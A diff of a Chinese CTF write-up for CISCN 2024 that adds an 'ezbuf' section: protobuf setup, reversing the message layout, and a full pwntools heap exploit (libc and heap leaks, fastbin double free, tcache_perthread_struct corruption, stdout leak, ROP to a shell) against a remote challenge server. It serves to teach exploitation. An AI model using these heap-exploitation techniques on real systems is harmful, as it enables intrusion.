@@ -26,7 +26,7 @@ go语言运行报错后会直接打印错误的返回地址，就不用gdb调试
 得出溢出点464
 ![](/img/wp/ciscn2024-初赛/gostack-cyclic-l.png)
 
-后面就是正常的利用syscall获取shell的流程了
+其实main_main_func2就是后门函数，不过懒得看代码了，直接用系统调用获取shell
 
 ### exp
 ```python
@@ -150,6 +150,17 @@ libc_base = leak_bk - (main_arena_offset+1640) #1640是调试获取的偏移
 
 下面是源码
 ```c
+#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+
+/* Get size, ignoring use bits */
+#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
+
+/* Like chunksize, but do not mask SIZE_BITS.  */
+#define chunksize_nomask(p)         ((p)->mchunk_size)
+
+#define fastbin_index(sz) \
+        ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
+
 #define REMOVE_FB(fb, victim, pp)			\
   do							\
     {							\
@@ -182,17 +193,6 @@ libc_base = leak_bk - (main_arena_offset+1640) #1640是调试获取的偏移
         // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。
         // 根据取得的 victim ，利用 chunksize 计算其大小。
         // 利用fastbin_index 计算 chunk 的索引
-        #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
-
-        /* Get size, ignoring use bits */
-        #define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
-
-        /* Like chunksize, but do not mask SIZE_BITS.  */
-        #define chunksize_nomask(p)         ((p)->mchunk_size)
-
-        #define fastbin_index(sz) \
-                ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
-
 	    size_t victim_idx = fastbin_index (chunksize (victim)); //这一句是检测的关键，我们要使计算后的victim_idx和idx相等
 
         //检测
@@ -344,11 +344,549 @@ p.interactive()
 
 ```
 
-## ez_buf
-protobuf pwn
+## ezbuf
+### protobuf
+#### 简介
+> 官方文档：https://protobuf.dev/overview/
 
-> Protobuf是一种高效的数据压缩编码方式，可用于通信协议，数据存储等
-> 官方文档翻译: https://www.cnblogs.com/silvermagic/p/9087593.html
+Protobuf是一种与语言无关、与平台无关的可扩展机制，用于序列化结构化数据。它类似于 JSON，但体积更小、速度更快，并且会生成本机语言绑定。您只需定义一次数据的结构，然后就可以使用专门生成的源代码轻松地将结构化数据写入各种数据流并使用各种语言读取这些结构化数据。
+
+它支持以下语言
+- C++
+- C#
+- Java
+- Kotlin
+- Objective-C
+- PHP
+- Python
+- Ruby
+
+其他语言(如C语言)需要额外安装插件
+
+#### 安装
+```bash
+# 首先安装依赖
+sudo apt install git g++ autoconf automake libtool curl make unzip
+
+# 安装 protobuf
+git clone https://github.com/protocolbuffers/protobuf.git
+cd protobuf
+git checkout v3.21.0 # 试过v27.0，protobuf-c装不上，所以用v3.21.0
+git submodule update --init --recursive # 安装子模块
+./autogen.sh   #生成配置脚本
+./configure    # 可选 --prefix=path ，默认路径为/usr/local/
+make -j 4          
+sudo make install 
+sudo ldconfig       # refresh shared library cache
+which protoc        # find the location
+protoc --version    # check
+
+# 安装 protobuf-c
+git clone https://github.com/protobuf-c/protobuf-c.git
+cd protobuf-c
+./autogen.sh
+./configure
+make -j 4
+sudo make install
+```
+
+之后我们会使用 protoc 生成 python 语言的结构化数据，便于利用 pwntools 发送数据
+
+#### 深入分析
+首先我们新建一个.proto文件，利用protoc生成一个c语言的代码，查看结构体，了解一下结构体的成员，方便逆向程序中的结构体
+```
+syntax="proto3"; //proto version 2 or 3
+
+message test{
+    bytes a = 1;
+    sint64 b = 2;
+    uint64 c = 3;
+}
+```
+将上述内容保存为test.proto文件，使用`protoc test.proto --c_out=./`生成相应的c语言代码
+
+```c
+static const ProtobufCFieldDescriptor test__field_descriptors[3] =
+{
+  {
+    "a",
+    1,
+    PROTOBUF_C_LABEL_NONE,
+    PROTOBUF_C_TYPE_BYTES,
+    0,   /* quantifier_offset */
+    offsetof(Test, a),
+    NULL,
+    NULL,
+    0,             /* flags */
+    0,NULL,NULL    /* reserved1,reserved2, etc */
+  },
+  {
+    "b",
+    2,
+    PROTOBUF_C_LABEL_NONE,
+    PROTOBUF_C_TYPE_SINT64,
+    0,   /* quantifier_offset */
+    offsetof(Test, b),
+    NULL,
+    NULL,
+    0,             /* flags */
+    0,NULL,NULL    /* reserved1,reserved2, etc */
+  },
+  {
+    "c",
+    3,
+    PROTOBUF_C_LABEL_NONE,
+    PROTOBUF_C_TYPE_UINT64,
+    0,   /* quantifier_offset */
+    offsetof(Test, c),
+    NULL,
+    NULL,
+    0,             /* flags */
+    0,NULL,NULL    /* reserved1,reserved2, etc */
+  },
+};
+static const unsigned test__field_indices_by_name[] = {
+  0,   /* field[0] = a */
+  1,   /* field[1] = b */
+  2,   /* field[2] = c */
+};
+static const ProtobufCIntRange test__number_ranges[1 + 1] =
+{
+  { 1, 0 },
+  { 0, 3 }
+};
+const ProtobufCMessageDescriptor test__descriptor =
+{
+  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,
+  "test",
+  "Test",
+  "Test",
+  "",
+  sizeof(Test),
+  3,
+  test__field_descriptors,
+  test__field_indices_by_name,
+  1,  test__number_ranges,
+  (ProtobufCMessageInit) test__init,
+  NULL,NULL,NULL    /* reserved[123] */
+};
+```
+
+生成的文件中涉及到了两个结构体
+- ProtobufCMessageDescriptor
+```c
+/**
+ * Describes a message.
+ */
+struct ProtobufCMessageDescriptor {
+	/** Magic value checked to ensure that the API is used correctly. */
+	uint32_t			magic;
+
+	/** The qualified name (e.g., "namespace.Type"). */
+	const char			*name;
+	/** The unqualified name as given in the .proto file (e.g., "Type"). */
+	const char			*short_name;
+	/** Identifier used in generated C code. */
+	const char			*c_name;
+	/** The dot-separated namespace. */
+	const char			*package_name;
+
+	/**
+	 * Size in bytes of the C structure representing an instance of this
+	 * type of message.
+	 */
+	size_t				sizeof_message;
+
+	/** Number of elements in `fields`. */
+	unsigned			n_fields;
+	/** Field descriptors, sorted by tag number. */
+	const ProtobufCFieldDescriptor	*fields;
+	/** Used for looking up fields by name. */
+	const unsigned			*fields_sorted_by_name;
+
+	/** Number of elements in `field_ranges`. */
+	unsigned			n_field_ranges;
+	/** Used for looking up fields by id. */
+	const ProtobufCIntRange		*field_ranges;
+
+	/** Message initialisation function. */
+	ProtobufCMessageInit		message_init;
+
+	/** Reserved for future use. */
+	void				*reserved1;
+	/** Reserved for future use. */
+	void				*reserved2;
+	/** Reserved for future use. */
+	void				*reserved3;
+};
+```
+- ProtobufCFieldDescriptor
+```c
+struct ProtobufCFieldDescriptor {
+	/** Name of the field as given in the .proto file. */
+	const char		*name;
+	/** Tag value of the field as given in the .proto file. */
+	uint32_t		id;
+	/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
+	ProtobufCLabel		label;
+	/** The type of the field. */
+	ProtobufCType		type;
+	/**
+	 * The offset in bytes of the message's C structure's quantifier field
+	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
+	 * for repeated members or the case enum for oneofs).
+	 */
+	unsigned		quantifier_offset;
+	/**
+	 * The offset in bytes into the message's C structure for the member
+	 * itself.
+	 */
+	unsigned		offset;
+	/**
+	 * A type-specific descriptor.
+	 *
+	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
+	 * corresponding `ProtobufCEnumDescriptor`.
+	 *
+	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
+	 * the corresponding `ProtobufCMessageDescriptor`.
+	 *
+	 * Otherwise this field is NULL.
+	 */
+	const void		*descriptor; /* for MESSAGE and ENUM types */
+	/** The default value for this field, if defined. May be NULL. */
+	const void		*default_value;
+	/**
+	 * A flag word. Zero or more of the bits defined in the
+	 * `ProtobufCFieldFlag` enum may be set.
+	 */
+	uint32_t		flags;
+	/** Reserved for future use. */
+	unsigned		reserved_flags;
+	/** Reserved for future use. */
+	void			*reserved2;
+	/** Reserved for future use. */
+	void			*reserved3;
+};
+```
+结构体中又涉及到了一个枚举类型 ProtobufCType
+```c
+typedef enum {
+	PROTOBUF_C_TYPE_INT32,      /**< int32 */
+	PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
+	PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
+	PROTOBUF_C_TYPE_INT64,      /**< int64 */
+	PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
+	PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
+	PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
+	PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
+	PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
+	PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
+	PROTOBUF_C_TYPE_FLOAT,      /**< float */
+	PROTOBUF_C_TYPE_DOUBLE,     /**< double */
+	PROTOBUF_C_TYPE_BOOL,       /**< boolean */
+	PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
+	PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
+	PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
+	PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
+} ProtobufCType;
+```
+更多相关信息请查看 [protobuf-c](https://protobuf-c.github.io/protobuf-c)
+利用这两个结构体和这个类型枚举便可以开始逆向程序了
+
+### 程序逆向
+#### protobuf message逆向
+分析ProtobufCMessageDescriptor
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-ProtobufCMessageDescriptor.png)
+
+我在ida中还原了 ProtobufCMessageDescriptor 结构体，便于观察，实际做题可以不用还原
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-structure-insert.png)
+
+再将之前数据段的变量的类型转为该结构体，得到如下结果
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-data-struct.png)
+
+发现n_fileds为5,表明其中含有5个变量，点进fields分析每个field
+
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-ProtobufCFieldDescriptor-field1.png)
+
+分析出第一个变量为bytes型，名为whatcon的变量，按照这样的方法依次提取出所有field，写到heybro.proto文件中
+```
+syntax="proto3"; //proto version 2 or 3
+
+message heybro{
+    bytes whatcon = 1;
+    sint64 whattodo = 2;
+    sint64 whatidx = 3;
+    sint64 whatsize = 4;
+    uint32 whatsthis = 5;
+}
+```
+
+利用`protoc heybro.proto --python_out=./`命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包
+
+生成的heybro_pb2.py文件
+```python
+# -*- coding: utf-8 -*-
+# Generated by the protocol buffer compiler.  DO NOT EDIT!
+# source: heybro.proto
+"""Generated protocol buffer code."""
+from google.protobuf.internal import builder as _builder
+from google.protobuf import descriptor as _descriptor
+from google.protobuf import descriptor_pool as _descriptor_pool
+from google.protobuf import symbol_database as _symbol_database
+# @@protoc_insertion_point(imports)
+
+_sym_db = _symbol_database.Default()
+
+
+
+
+DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x0cheybro.proto\"a\n\x06heybro\x12\x0f\n\x07whatcon\x18\x01 \x01(\x0c\x12\x10\n\x08whattodo\x18\x02 \x01(\x12\x12\x0f\n\x07whatidx\x18\x03 \x01(\x12\x12\x10\n\x08whatsize\x18\x04 \x01(\x12\x12\x11\n\twhatsthis\x18\x05 \x01(\rb\x06proto3')
+
+_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, globals())
+_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'heybro_pb2', globals())
+if _descriptor._USE_C_DESCRIPTORS == False:
+
+  DESCRIPTOR._options = None
+  _HEYBRO._serialized_start=16
+  _HEYBRO._serialized_end=113
+# @@protoc_insertion_point(module_scope)
+```
+
+#### python使用protobuf
+```python
+import heybro_pb2
+data = heybro_pb2.heybro() # 方法名称跟随.proto中结构体名称变化
+data.whattodo = todo
+data.whatcon = content
+data.whatidx = index
+data.whatsize = size
+data.whatsthis = this
+data.SerializeToString() # 转换成bytes
+```
+
+#### 静态分析
+先看看主函数，稍微改了点名字，加了点注释
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-main.png)
+
+再看看menu函数
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-menu.png)
+
+#### 动态分析
+首先编写交互逻辑，主要是将create函数和show函数用python实现出来
+```python
+from pwn import *
+import heybro_pb2
+
+p = process("./pwn")
+
+context.log_level = 'debug'
+#context.terminal = ['tmux','splitw','-h']
+
+def create(idx,content):
+    data = heybro_pb2.heybro()
+    data.whattodo = 1
+    data.whatcon = content
+    data.whatidx = idx
+    data.whatsize = 0
+    data.whatsthis = 0
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def delete(idx):
+    data = heybro_pb2.heybro()
+    data.whattodo = 2
+    data.whatcon = b'0'
+    data.whatidx = idx
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def show(idx):
+    data = heybro_pb2.heybro()
+    data.whattodo = 3
+    data.whatcon = b'0'
+    data.whatidx = idx
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def do_nothing(content):
+    data = heybro_pb2.heybro()
+    data.whattodo = 0
+    data.whatcon = content
+    data.whatidx = 1
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)    
+
+gdb.attach(p)
+create(0,b'aaaaaaaa')
+show(0)
+
+p.interactive()
+```
+编写这样的程序，调试运行。将运行菜单函数前后的堆打印出来比较，主要有两处不同
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-1.png)
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-2.png)
+查看不同堆块的数据
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-hexdump.png)
+最终运行结果
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak.png)
+
+第一处不同是解包过程中申请的内存块，这里可以得知解包中会申请与content大小相同的堆块存放内容
+第二次不同是menu函数申请的0x30大小的堆块，用来存放content，不过把smallbin的bk指针一起copy了
+可以得知输入8字节数据后可以泄露出一个smallbin的bk指针，调试获取偏移即可计算libc基址
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak-2.png)
+
+得到偏移 2206944(0x21ace0)
+
+### 思路
+1. 通过遗留的small bin的bk指针调试获取偏移，计算libc基址
+2. 将堆块释放进入tcache，利用PROTECT_PTR机制获取堆上地址(缺少最后12bit)，调试获取与heap基址的偏移，计算heap基址
+3. 申请0x40的堆块，填满tcache
+4. 利用double free构造fastbin循环链表
+5. 将所有0x40大小的tcache全部申请出来
+6. 调试获取循环链表中第一个链表的地址与heap_base的差值(为了生成PROTECT_PTR保护后的地址)
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak-3.png)
+7. 利用PROTECT_PTR公式，填充相应的地址`p64((heap_base + 0xf0)^((heap_base + 0x004e40)>>12))`
+![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-alloc.png)
+8. 在heap_base + 0xf0处(即0xf0大小的tcache块的entries指针处)，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct，关于这个结构体的攻击，可以查看[tcache-perthread-corruption](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-perthread-corruption)
+9. 之后便可以更改tcache_perthread_struct了，可以实现tcache的任意分配，分配到stdout更改write_ptr和write_end指针泄露environ，调试environ与栈的偏移计算出栈地址，然后在利用tcache_perthread_struct分配到栈上进行ret2libc
+
+关于tcache_perthread_struct的构造、_IO_2_1_stdout_的构造，最后栈偏移的计算还不熟悉，之后再练练
+整个周末都在看这题，总算是解决一部分了
+
+### exp
+```python
+from pwn import *
+import heybro_pb2
+
+#p = process("./pwn")
+p = remote("pwn.challenge.ctf.show",28127)
+elf = ELF("./pwn")
+remote_libc = ELF("./libc.so.6")
+local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = remote_libc
+
+context.log_level = 'debug'
+#context.terminal = ['tmux','splitw','-h']
+
+def create(idx,content):
+    data = heybro_pb2.heybro()
+    data.whattodo = 1
+    data.whatcon = content
+    data.whatidx = idx
+    data.whatsize = 0
+    data.whatsthis = 0
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def delete(idx):
+    data = heybro_pb2.heybro()
+    data.whattodo = 2
+    data.whatcon = b'0'
+    data.whatidx = idx
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def show(idx):
+    data = heybro_pb2.heybro()
+    data.whattodo = 3
+    data.whatcon = b'0'
+    data.whatidx = idx
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)
+ 
+def do_nothing(content):
+    data = heybro_pb2.heybro()
+    data.whattodo = 0
+    data.whatcon = content
+    data.whatidx = 1
+    data.whatsize = 1
+    data.whatsthis = 1
+    data = data.SerializeToString()
+    p.recvuntil(b'WANT?\n')
+    p.send(data)    
+
+for i in range(9):
+    create(i,b'aaaaaaaa')
+
+# leak libc_base
+show(0)
+p.recvuntil(b'aaaaaaaa')
+leak = u64(p.recv(6).ljust(8,b'\x00'))
+libc_base = leak - 0x21ace0
+log.success('libc_base : ' + hex(libc_base))
+
+# leak heap_base
+delete(0)
+show(0)
+p.recvuntil(b'Content:')
+leak = u64(p.recv(5).ljust(8,b'\x00'))
+heap_base = (leak << 12) - 0x2000 
+log.success('heap_addr : ' + hex(heap_base))
+
+# fill 0x40 tcache
+for i in range(6):
+    delete(i+1)
+
+# double free fastbin
+delete(7)
+delete(8)
+delete(7)
+
+# malloc all tcache
+for i in range(7):
+    create(i,b'a'*8)
+
+environ = libc_base + libc.sym['environ']
+stdout = libc_base + libc.sym['_IO_2_1_stdout_']
+
+create(7,p64((heap_base+0xf0)^((heap_base+0x004e40)>>12)))
+create(8,b'aaaaaa')
+create(8,b'a')
+
+# fill heap_base+0xf0 entries ptr
+create(8,p64(0) + p64(heap_base+0x10))
+
+do_nothing((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b"\x00"))
+
+# leak stack_addr
+do_nothing(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) 
+leak = u64(p.recv(6).ljust(8,b'\x00'))
+stack_addr = leak - 0x1a8 + 0x40
+log.success("stack_addr : " + hex(stack_addr))
+
+do_nothing((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(0)+p64(0)+p64(stack_addr)).ljust(0xa0,b"\x00"))
+
+#gdb.attach(p)
+
+pop_rdi = 0x2a3e5 + libc_base
+system = libc.sym['system'] + libc_base
+binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
+ret = 0x2a3e6 + libc_base
+payload = cyclic(8) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)
+payload = payload.ljust(0x58,b'\x00')
+
+do_nothing(payload)
+
+p.interactive()
+```
 
 ## EzHeap
 
